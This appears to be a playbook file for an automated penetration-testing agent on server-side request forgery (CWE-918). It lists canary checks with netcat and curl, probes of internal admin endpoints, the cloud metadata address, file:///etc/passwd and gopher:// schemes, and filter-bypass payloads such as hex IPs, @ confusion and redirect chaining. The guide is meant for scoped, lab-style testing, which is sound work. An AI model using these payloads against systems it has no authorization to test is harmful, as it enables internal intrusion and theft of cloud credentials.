---
name: ssrf
description: Server-Side Request Forgery — webhook/import/avatar URLs, metadata endpoints, redirect chaining
---

# Server-Side Request Forgery (CWE-918)

## 1. Find URL-accepting inputs

Inventory parameters whose VALUE looks like a URL or hostname: webhook
callbacks, avatar/profile-image URLs, import-from-URL, PDF generators,
link previews, `?url=`, `?next=`, `?source=`, XML/SVG imports.

## 2. Canary first — never guess

Point the parameter at a host you control or can observe, inside scope
constraints. Options in a lab: a netcat listener in your sandbox
(`nc -lvnp 9090 &`) with `http://<sandbox-ip>:9090/canary`, or a DNS name
that resolves. A single hit proves the server fetches attacker-supplied
URLs.

```bash
printf 'ssrf-canary' > /dev/tcp/127.0.0.1/9090  # or run: nc -lvnp 9090
curl -s -X POST <target>/api/profile/image \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://<listener-ip>:9090/canary"}'
```

Watch the listener: connection = confirmed SSRF. No listener hit after a
couple of variants (http/https, IP vs hostname) → likely not fetchable;
time-box it.

## 3. Prove impact

- Internal reachability: fetch an internal-only endpoint and diff against
  your direct request:
  ```bash
  curl -s -X POST <target>/api/fetch -d '{"url":"http://localhost:3000/admin"}'
  ```
- Cloud metadata (in real clouds): `http://169.254.169.254/latest/meta-data/`
  — in lab networks use the internal-service equivalent.
- Scheme/file tricks: `file:///etc/passwd`, `gopher://` — note which parse.
- Blind SSRF: no response body? Use timing (`time curl`) or a canary hit
  as the evidence; report as blind with confidence accordingly.

## 4. Bypass checklist (only if a filter exists)

`http://127.0.0.1` → `http://0x7f000001`, `http://0.0.0.0`, `http://[::1]`,
`http://localhost.attacker-controlled` DNS rebinding (lab only), redirects
(SSRF fetcher following a 302 from an allowed host to an internal one),
`@` confusion: `http://expected-host@127.0.0.1/`.

## 5. Validation bar

- Evidence: the canary connection log AND/OR the internal response body
  that your sandbox could not reach directly.
- PoC: the exact request. Severity: metadata/internal-admin reachability =
  critical/high; plain internal port scan = medium; failed filters = low.
